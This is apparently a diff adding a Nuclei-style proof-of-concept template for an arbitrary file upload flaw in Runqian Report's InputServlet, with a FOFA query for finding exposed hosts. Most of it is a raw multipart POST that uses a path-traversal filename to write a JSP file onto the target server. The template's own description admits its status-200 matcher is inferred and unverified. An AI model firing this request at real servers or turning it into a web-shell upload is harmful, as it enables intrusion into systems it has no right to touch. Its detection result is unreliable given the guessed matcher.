@@ -1,0 +1,52 @@
+id: poc-513091032
+info:
+  name: 润乾报表InputServlet存在任意文件上传漏洞_rch3alpl6tb8i0rv
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: body="virexp/s"
+http:
+- raw:
+  - 'POST /InputServlet?action=12 HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 241
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="upsize"
+
+
+    1024
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\2211.jsp"
+
+    Content-Type: image/jpeg
+
+
+    123
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
